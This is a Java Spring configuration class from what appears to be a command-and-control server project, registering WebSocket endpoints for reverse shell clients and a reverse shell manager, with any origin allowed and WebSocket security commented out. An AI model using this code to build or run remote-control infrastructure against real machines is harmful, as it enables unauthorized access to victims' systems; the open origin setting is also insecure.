package com.mtattab.c2cServer.config;

import com.mtattab.c2cServer.controller.websocket.ReverseShellClientsHandler;
import com.mtattab.c2cServer.controller.websocket.ReverseShellManagerHandler;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.annotation.web.socket.AbstractSecurityWebSocketMessageBrokerConfigurer;
import org.springframework.security.config.annotation.web.socket.EnableWebSocketSecurity;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.util.StringUtils;
import org.springframework.web.socket.WebSocketHandler;
import org.springframework.web.socket.config.annotation.EnableWebSocket;
import org.springframework.web.socket.config.annotation.WebSocketConfigurer;
import org.springframework.web.socket.config.annotation.WebSocketHandlerRegistry;
import org.springframework.web.socket.server.HandshakeHandler;
import org.springframework.web.socket.server.support.DefaultHandshakeHandler;

import java.security.Principal;
import java.util.Map;

import static com.mtattab.c2cServer.util.Constants.WEBSOCKET_REVERSE_SHELL;

@Configuration
@EnableWebSocket
//@EnableWebSocketSecurity
public class WebSocketConfig  implements WebSocketConfigurer {

    @Autowired
    ReverseShellClientsHandler reverseShellClientsHandler;

    @Autowired
    ReverseShellManagerHandler reverseShellManagerHandler;

    @Override
    public void registerWebSocketHandlers(WebSocketHandlerRegistry registry) {
        registry.addHandler(reverseShellClientsHandler, WEBSOCKET_REVERSE_SHELL)
                .setAllowedOrigins("*")

                .addHandler(reverseShellManagerHandler, "/reverseShellManager")

        ; // Configure allowed origins as needed


    }


}
